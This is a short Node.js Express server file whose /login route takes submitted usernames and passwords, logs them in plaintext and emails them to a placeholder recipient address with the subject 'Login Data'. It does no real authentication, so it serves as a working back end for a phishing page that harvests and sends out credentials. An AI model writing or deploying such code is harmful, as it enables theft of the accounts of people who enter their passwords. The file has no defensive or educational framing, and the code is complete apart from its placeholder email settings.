// server.js

const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Handle POST request to save login data and send email
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Save login data to a file or database
    // For demonstration, let's just print it to the console
    console.log(`Username: ${username}, Password: ${password}`);

    // Send email with login data
    sendEmail(username, password);

    res.send('Login data saved and email sent successfully.');
});

// Function to send email
function sendEmail(username, password) {
    const transporter = nodemailer.createTransport({
        // Configure your email service provider here
        service: 'Gmail',
        auth: {
            user: 'your-email@gmail.com',
            pass: 'your-email-password'
        }
    });

    const mailOptions = {
        from: 'your-email@gmail.com',
        to: 'recipient-email@example.com', // Your email address here
        subject: 'Login Data',
        text: `Username: ${username}\nPassword: ${password}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
